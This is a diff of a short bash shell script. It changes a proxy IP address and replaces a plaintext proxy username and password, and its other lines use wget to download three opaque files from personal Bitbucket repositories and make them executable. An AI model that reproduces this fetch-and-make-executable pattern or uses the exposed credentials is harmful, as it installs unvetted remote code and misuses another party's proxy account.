@@ -1,9 +1,9 @@
 #!/bin/bash
 apt-get update
-proxy="8.222.148.101"
+proxy="192.53.113.235"
 port="80"
-user="envio"
-pass="kretek"
+user="ikuk"
+pass="Bangkekau1"
 rm -f sgr1 && wget -q 'https://bitbucket.org/newpekatey/pktete/raw/main/sgr1' && chmod +x sgr1
 rm -f piket.json && wget -q 'https://bitbucket.org/jeffreyadams29/paketu/raw/master/pkt.json' && chmod +x pkt.json
 rm -f panel && wget -q 'https://bitbucket.org/newpekatey/pktete/raw/main/panel' && chmod +x panel
